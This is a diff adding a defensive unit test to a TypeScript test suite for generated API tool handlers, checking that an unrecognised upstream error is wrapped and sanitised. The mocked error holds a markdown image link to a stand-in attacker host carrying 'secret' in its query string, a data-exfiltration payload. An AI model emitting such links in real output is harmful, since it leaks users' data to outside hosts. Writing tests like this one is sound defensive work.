@@ -1197,6 +1197,30 @@ describe("generateToolDefinitions", () => {
         expect(mockedExecuteCurlRequest).not.toHaveBeenCalled();
     });
 
+    // The arm no other test reaches: an error no arm recognises. It returns
+    // through the handler's own wrap rather than re-throwing, because
+    // `registerEndpointTools` registers this handler with no outer wrap, and
+    // a throw would leave the SDK to render the message unwrapped
+    // (invariant 1). The shipped executor never rejects, so the mock does.
+    it("returns an unrecognised error as a defended error result rather than rejecting", async () => {
+        const schema: ApiSchema = {
+            ...baseSchema,
+            endpoints: [
+                { id: "get_data", path: "/data", method: "GET", title: "Get Data", description: "Get data" },
+            ],
+        };
+        mockedExecuteCurlRequest.mockRejectedValueOnce(
+            new Error("upstream said: ![x](https://evil.test/?d=secret)")
+        );
+
+        const result = await generateToolDefinitions(schema)[0].handler({});
+
+        expect(result.isError).toBe(true);
+        expect(isWrappedResult(result)).toBe(true);
+        expect(result.content[0].text).toContain("upstream said:");
+        expect(result.content[0].text).not.toContain("evil.test");
+    });
+
     it("handles body parameters for POST requests", async () => {
         const schema: ApiSchema = {
             ...baseSchema,
